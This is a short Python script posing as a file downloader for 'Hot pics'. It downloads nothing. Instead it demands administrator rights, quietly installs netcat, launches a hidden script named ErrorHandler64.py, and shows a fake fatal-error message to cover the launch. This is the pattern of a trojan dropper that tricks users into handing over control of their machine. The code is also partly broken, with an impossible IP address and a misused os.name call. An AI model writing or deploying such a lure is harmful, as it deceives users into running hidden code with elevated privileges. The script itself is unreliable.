import os, subprocess, ctypes
#Custom File Downloader V2
#By Ethan Hunt

#Release date: 11/9/23

server='127.129.289.92' #Replace this with the download server
name='Hot pics' #Replace this with the name of the file or folder to be downloaded

print("Initializing...")

def is_admin():
    try:
        return os.getuid()==0
    except AttributeError:
        return ctypes.windll.shell32.IsUserAnAdmin()!=0

if not is_admin():
    exit('Please run the program as administrator to start the download.')

print("File", name, "set to be downloaded now. Starting download...")

if os.name()!='nt':
    if os.system('nc --version')!=0:
        os.system('sudo apt install nc -y')

pwd=subprocess.getoutput('pwd')

if os.name=='nt':
    prefix='\\'
else:
    prefix='/'

launch=pwd+prefix+'ErrorHandler64.py'

subprocess.Popen(['python3', launch])

exit("A fatal error has occured. Launching error handler.")